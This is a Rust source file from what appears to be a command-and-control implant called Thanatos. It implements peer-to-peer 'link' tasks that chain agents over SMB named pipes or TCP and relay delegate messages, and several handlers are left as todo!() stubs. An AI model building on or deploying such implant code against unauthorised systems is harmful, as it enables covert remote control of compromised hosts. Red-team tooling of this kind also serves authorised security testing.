use std::net::TcpStream;

use agent_utils::{
    debug_invoke,
    errors::ThanatosError,
    msg::{DelegateC2ProfileName, DelegateMessage, GetTaskingMsg, PendingTask, TaskResults},
};
use serde::Deserialize;

#[cfg(target_os = "windows")]
mod smb;
mod tcp;

#[derive(Deserialize)]
struct LinkParameters {
    connection_info: LinkConnectionInfo,
}

#[derive(Deserialize, Debug)]
pub struct LinkConnectionInfo {
    pub host: String,
    pub agent_uuid: String,
    c2_profile: LinkC2Profile,
}

#[cfg(target_os = "windows")]
#[derive(Deserialize, Debug)]
#[serde(tag = "name", content = "parameters")]
enum LinkC2Profile {
    #[serde(rename = "smb")]
    Smb(smb::SmbParameters),

    #[serde(rename = "tcp")]
    Tcp(tcp::TcpParameters),
}

#[cfg(target_os = "linux")]
#[derive(Deserialize, Debug)]
#[serde(tag = "name", content = "parameters")]
enum LinkC2Profile {
    #[serde(rename = "tcp")]
    Tcp(tcp::TcpParameters),
}

#[cfg(target_os = "windows")]
impl Into<DelegateC2ProfileName> for LinkC2Profile {
    fn into(self) -> DelegateC2ProfileName {
        match self {
            Self::Smb(..) => DelegateC2ProfileName::Smb,
            Self::Tcp(..) => DelegateC2ProfileName::Tcp,
        }
    }
}

#[cfg(target_os = "linux")]
impl Into<DelegateC2ProfileName> for LinkC2Profile {
    fn into(self) -> DelegateC2ProfileName {
        match self {
            Self::Tcp(..) => DelegateC2ProfileName::Tcp,
        }
    }
}

pub struct DelegateInfo {
    pub host: String,
    pub uuid: String,
    pub profile: DelegateC2Profile,
}

#[allow(dead_code)]
pub enum DelegateC2Profile {
    TCP {
        port: u16,
        stream: Option<TcpStream>,
    },
    SMB {
        pipe: String,
    },
}

impl super::Tasker {
    pub(super) fn add_link(&mut self, task: &PendingTask) -> Result<TaskResults, ThanatosError> {
        agent_utils::log!("{:?}", &task);
        let link_parameters: LinkParameters = debug_invoke!(
            serde_json::from_str(&task.parameters),
            ThanatosError::JsonDecodeError
        );

        #[cfg(target_os = "windows")]
        match link_parameters.connection_info.c2_profile {
            LinkC2Profile::Smb(ref parameters) => {
                smb::connect(link_parameters.connection_info.host, parameters)?
            }
            LinkC2Profile::Tcp(parameters) => todo!(),
        };

        #[cfg(target_os = "linux")]
        match link_parameters.connection_info.c2_profile {
            LinkC2Profile::Tcp(_parameters) => (),
        };

        Ok(TaskResults {
            completed: true,
            user_output: Some("Linking?".to_string()),
            ..Default::default()
        })
    }

    #[allow(unused)]
    pub(super) fn delegate_handle(
        &mut self,
        idx: usize,
        delegate_msg: DelegateMessage,
    ) -> Result<Option<DelegateMessage>, ThanatosError> {
        if let Some(connection_info) = self.delegates.get_mut(idx) {
            match &mut connection_info.profile {
                DelegateC2Profile::TCP { port, stream } => todo!(),
                DelegateC2Profile::SMB { pipe } => todo!(),
            }
        } else {
            Ok(None)
        }
    }

    pub(super) fn process_delegates(
        &mut self,
        completed_msg: &mut GetTaskingMsg,
        delegate_msgs: Vec<DelegateMessage>,
    ) {
        for delegate_msg in delegate_msgs {
            if let Some(idx) = self
                .delegates
                .iter()
                .position(|d| d.uuid == delegate_msg.uuid)
            {
                match self.delegate_handle(idx, delegate_msg) {
                    Ok(Some(v)) => completed_msg.delegates.push(v),
                    Err(_) => {
                        self.delegates.remove(idx);
                    }
                    _ => (),
                }
            }
        }
    }
}
